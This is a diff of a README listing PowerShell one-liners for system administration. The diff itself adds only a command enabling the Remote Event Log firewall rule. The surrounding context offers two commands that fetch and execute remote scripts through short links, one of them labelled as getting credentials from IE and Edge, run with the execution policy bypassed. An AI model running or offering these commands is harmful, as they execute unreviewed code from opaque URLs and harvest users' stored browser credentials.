@@ -25,6 +25,11 @@ SysAdmin stuff using the all powerful powershell. Commands that are hopefully he
 #### Bloatware Remover
 ```iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/debloat'))```
 
+#### Remote Event Viewer 
+```  Set-NetFirewallRule -DisplayGroup 'Remote Event Log Management' -Enabled True -PassThru```
+
+#### 
+
 #### Get creds from IE and Edge
 ```powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/2K75g15’)"```
 ```
